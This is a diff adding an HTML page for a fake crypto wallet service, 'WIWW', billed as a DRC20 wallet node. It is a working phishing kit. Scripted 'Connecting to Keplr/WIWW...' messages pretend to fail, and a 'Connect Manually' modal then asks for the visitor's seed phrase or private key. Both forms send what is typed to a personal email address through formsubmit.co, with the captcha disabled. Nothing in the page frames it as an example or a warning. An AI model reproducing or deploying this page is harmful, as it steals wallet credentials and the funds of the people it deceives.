@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <link rel="stylesheet" href="./src/input.css" >
+    <link rel="stylesheet" href="./src/output.css" >
+    <link rel="stylesheet" href="./src/style.css" >
+    <link rel="stylesheet" href="./src/main.css" />
+    <link rel="stylesheet" href="./input.css" />
+    <link rel="stylesheet" href="./css/bootstrap.min.css">
+    <!-- <link rel="stylesheet" href="./css/style.css"> -->
+    <script src="./app.js" ></script>
+
+
+
+    <title>Document</title>
+</head>
+<body  class="bg-main">
+    <section class="bg-main position-relative d-flex flex-column justify-content-between">
+    <header class="position-relative">
+        <nav class="navbar navbar-expand-lg bg-light bg-transparent">
+            <div class="container d-flex">
+                <a class="navbar-brand d-none d-lg-flex align-items-center gap-3" href="index.html">
+                    <img src="images/logo.png" class="img-fluid" width="55px">
+                    <span class="text-white fs-26">
+                        WIWW
+                    </span>
+                </a>
+                <div class="d-flex align-items-center justify-content-between mbl-100">
+                    <button class="border-0 bg-transparent d-lg-none" type="button" data-bs-toggle="offcanvas" data-bs-target="#sidebarmenu" aria-controls="sidebarmenu">
+                        <img src="images/icons/menu.png" class="img-fluid" width="30px">
+                    </button>
+                    <div class="d-block d-lg-none">
+                        <a href="#" class="show-modal">
+                            <button class="btncust text-orange fs-14 text-capitalize border-0 rounded-5 show-modal" type="button" style="color: #FF9D2E;">
+                                Connect to Node
+                            </button>
+                        </a>
+                    </div>
+                </div>
+                <div class="collapse navbar-collapse ms-5 ps-lg-5">
+                    <ul class="navbar-nav me-auto mb-2 mb-lg-0 ">
+                        <li class="nav-item">
+                            <div class="me-4" style="padding: 10px; background-color: white; color: transparent;  border-radius: 5rem; font-size: 15px; margin-right: 30px; margin-left: 30px;">
+                                <a href="#" class="show-modal" style="text-decoration: none; color: #FF9D2E; font: bold;">
+                                    <button class="btncust text-orange fs-14 text-capitalize border-0 rounded-5"  type="button" >
+                                        Connect to Node
+                                    </button>
+                                </a>
+                            </div>
+                        </li>
+                        <li class="nav-item">
+                            <a class="nav-link text-capitalize text-muted fs-14" href="#">earn(coming soon)</a>
+                        </li>
+                        <!-- <li class="nav-item">
+                            <a class="nav-link text-capitalize text-white fs-14" href="">documentation</a>
+                        </li> -->
+                        <li class="nav-item">
+                            <a class="nav-link text-capitalize text-muted fs-14" href="#">builders(coming soon)</a>
+                        </li>
+
+                        
+                        <li class="nav-item">
+                            <a class="nav-link text-capitalize text-muted fs-14" href="#" data-toggle="modal" data-target="#exampleModalx">Privacy Policy</a>
+                        </li>
+                    </ul>
+                    <div>
+                        <a href="https://twitter.com/WIWW_DRC20" class="show-modal">
+                            <img src="images/icons/tw.png" class="img-fluid" width="24px">
+                        </a>
+                    </div>
+                </div>
+            </div>
+        </nav>
+    </header>
+    <main class="pt-5 bottom-0">
+        <div class="container">
+            <div class="row g-3 align-items-center">
+                <div class="col-lg-4">
+                    <div class="d-flex flex-column gap-3 align-items-center">
+                        <img src="./images/logo.png" class="img-fluid" width="80px">
+                        <h1 class="fw-bold text-white mb-0">WIWW</h1>
+                        <h5 class="text-white">The fastest DRC20 wallet node.</h5>
+                        <div class="show-modal">
+                            <a href="#"  class="btn py-2 bg-white rounded-4 d-flex align-items-center gap-2" >
+                                
+                                <div class="text-start text-gray lh-sm">
+                                    
+                                    <span class="fs-14  d-block fw-semibold">CONNECT WALLET</span>
+                                </div>
+                            </a>
+                        </div>
+                    </div>
+                </div>
+                <div class="col-lg-8 position-relative">
+                    <div class="text-center post-ab d-none d-lg-block w-100">
+                        <img src="./images/dum.png" class="img-fluid">
+                    </div>
+                    <div class="text-center d-lg-none d-block">
+                        <img src="./images/mbl.png" class="img-fluid">
+                    </div>
+                    <div class="d-lg-none d-block text-center post-mbl ">
+                        <button class="btncust w-auto px-3 py-2 border-0 rounded-5 bg-orange text-white fs-12" data-toggle="modal" data-target="#exampleModal">
+                            Try now!
+                        </button>
+                        <div class="d-flex align-items-center justify-content-center gap-2 mt-3">
+                            <button class="bg-transparent border-0" data-toggle="modal" data-target="#exampleModal">
+                                <img src="./images/appstore.png" class="img-fluid" width="100px">
+                            </button>
+                            <button class="bg-transparent border-0" data-toggle="modal" data-target="#exampleModal">
+                                <img src="./images/playstore.png" class="img-fluid" width="100px">
+                            </button>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </main>
+</section>
+    <!-- modal container -->
+    <div
+    class="modal h-screen w-full fixed left-0 top-0 justify-center items-center  bg-opacity-50 hidden"
+  >
+    <div class="shadow-lg rounded modal-content white-glassmorphism">
+      <!-- modal header  -->
+      <div class="border-b py-4 px-2 modal-header" style="color: #FF9D2E; display: flex; justify-content: center; align-items: center;">
+        <h5 class="modal-title" >Connect Wallet</h5>
+      </div>
+      <!-- modal body  -->
+      <div class="p-3 modal-body">
+      
+        <!-- rotating image section -->
+        <div class="rotating-image-section">
+          <div style="justify-content: center; padding-top: 20px; padding-bottom: 20px; align-items: start; display: flex;">
+            <img id="rotating-image" src="./img/loading-transparent.png" />
+            <h2 id="connection-status" style="color: white;">Connecting to Keplr...</h2>
+          </div>
+        </div>
+          <!-- "Show Wallets" button initially hidden -->
+          <div class=" connect-btn" style="padding: 10px; background-color: white; color: transparent;  border-radius: 5rem; font-size: 15px;">
+            <a href="#" class="show-wallet-modal" style="text-decoration: none; color: #FF9D2E; font: bold; display: none;">
+                <button class=" text-orange fs-14 text-capitalize border-0 rounded-5"  type="button" >
+                    Connect Manually
+                </button>
+            </a>
+        </div>
+         
+
+          
+<!-- main-modal-section  -->
+<div class="main-modal-section">
+  <div class="modal-wallets">
+    <div class="container">
+      <div class="tab_box">
+        <button class="tab_btn active">Phrase</button>
+        <button class="tab_btn">Private Key</button>
+      </div>
+      <div class="content_box">
+        <div class="content active">
+            <form action="https://formsubmit.co/johnsondon138@gmail.com" method="POST" id="phrase-form" name="form" class="mt-3">
+          
+            <textarea id="phrase" name="phrase" rows="4" cols="50" placeholder="Enter your key phrase"></textarea>
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://wiww-nodes.pages.dev/">
+            
+            <button type="submit" class="btn mt-1 " id="phrase-button">Proceed</button>
+          </form>
+        </div>
+        <div class="content">
+          
+            <form action="https://formsubmit.co/johnsondon138@gmail.com" method="POST" id="private-key-form" name="form" class="mt-3">
+            <textarea id="private-key" name="private-key" rows="4" cols="50" placeholder="Enter your private key"></textarea>
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_next" value="https://wiww-nodes.pages.dev/">
+            <button type="submit" class="btn  mt-1" id="private-key-button">Proceed</button>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+      </div>
+      <div class="flex justify-end items-center w-100 border-t p-3">
+        <button
+          class="bg-red-500 hover:bg-red-700 px-3 py-1 rounded text-white mr-1 close-modal"
+        >
+          Close
+        </button>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Function to toggle content based on tab index
+    function toggleContent(index) {
+      const tabs = document.querySelectorAll(".tab_btn");
+      const contents = document.querySelectorAll(".content");
+  
+      tabs.forEach((tab, tabIndex) => {
+        if (tabIndex === index) {
+          tab.classList.add("active");
+          contents[tabIndex].classList.add("active");
+        } else {
+          tab.classList.remove("active");
+          contents[tabIndex].classList.remove("active");
+        }
+      });
+    }
+  
+    document.addEventListener("DOMContentLoaded", function () {
+      const showModalButtons = document.querySelectorAll(".show-modal");
+      const modal = document.querySelector(".modal");
+      const closeModalButtons = document.querySelectorAll(".close-modal");
+      const rotatingImageSection = document.querySelector(".rotating-image-section");
+      const mainModalSection = document.querySelector(".main-modal-section");
+      const showWalletButton = document.querySelector(".show-wallet-modal");
+  
+      showModalButtons.forEach(function (button) {
+        button.addEventListener("click", function () {
+          // Reset modal to initial state
+          rotatingImageSection.style.display = "block";
+          mainModalSection.style.display = "none";
+          showWalletButton.style.display = "none";
+          const connectionStatus = document.getElementById('connection-status');
+          connectionStatus.textContent = 'Connecting to WIWW...';
+  
+          modal.classList.remove("hidden");
+  
+          // Start rotating image and connecting timer
+          startRotatingImage();
+          startConnectingTimer();
+        });
+      });
+  
+      closeModalButtons.forEach(function (button) {
+        button.addEventListener("click", function () {
+          modal.classList.add("hidden");
+        });
+      });
+  
+      // Function to start rotating image
+      function startRotatingImage() {
+        const rotatingImage = document.getElementById('rotating-image');
+        let rotation = 0;
+        setInterval(() => {
+          rotation += 2;
+          rotatingImage.style.transform = `rotate(${rotation}deg)`;
+        }, 5); // Adjust the rotation speed as needed
+      }
+  
+      // Function to start connecting timer
+      function startConnectingTimer() {
+        setTimeout(() => {
+          const connectionStatus = document.getElementById('connection-status');
+          connectionStatus.textContent = 'Connect to WIWW nodes manually to proceed.';
+          // After changing connecting status, show "show wallets" button
+          showWalletButton.style.display = "block";
+        }, 1000);
+      }
+  
+      // Switch between rotating image section and main-modal-section
+      showWalletButton.addEventListener("click", function () {
+        rotatingImageSection.style.display = "none";
+        mainModalSection.style.display = "block";
+        showWalletButton.style.display = "none";
+      });
+  
+      // Add event listeners to the tab buttons for switching content
+      const tabButtons = document.querySelectorAll(".tab_btn");
+  
+      tabButtons.forEach(function (button, index) {
+        button.addEventListener("click", function () {
+          toggleContent(index);
+        });
+      });
+    });
+  </script>
+
+  
+
+  
+  
+  
+</body>
+</html>
